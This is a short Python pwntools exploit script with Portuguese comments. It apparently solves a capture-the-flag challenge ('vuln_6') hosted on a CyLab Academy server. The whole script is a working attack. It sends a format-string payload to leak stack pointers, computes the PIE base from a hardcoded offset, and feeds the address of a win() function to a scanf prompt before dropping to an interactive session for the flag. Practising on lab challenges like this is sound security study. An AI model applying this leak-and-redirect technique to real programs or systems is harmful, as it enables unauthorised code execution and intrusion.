from pwn import *

binary = './vuln_6'
context.binary = elf = ELF(binary)

p = remote('xebec.cylabacademy.net', 29528)

# Envia o payload de format string para vazar os primeiros índices
payload = b"|".join([f"%{i}$p".encode() for i in range(1, 10)])
p.sendlineafter(b'Enter your name:', payload)

response = p.recvline().decode().strip()
print(f"[*] Resposta completa: {response}")

# Pega o primeiro valor da stack (índice 1), que é sempre o ponteiro do ELF (.text)
parts = response.split('|')
leak_str = parts[0]
leak = int(leak_str, 16)
print(f"[+] Ponteiro do ELF capturado (%1$p): {hex(leak)}")

# Subtrai o offset estático correto da instrução (0x12a1)
elf.address = leak - 0x12a1
win_addr = elf.address + 0x376

log.success(f"PIE Base: {hex(elf.address)}")
log.success(f"Endereço de win(): {hex(win_addr)}")

# Envia o endereço puro em hexadecimal (sem o '0x') para o scanf("%lx")
payload_hex = hex(win_addr)[2:].encode()
log.info(f"Enviando para o scanf: {payload_hex}")

p.sendlineafter(b'enter the address to jump to, ex => 0x12345:', payload_hex)

# Interage e pega a flag
p.interactive()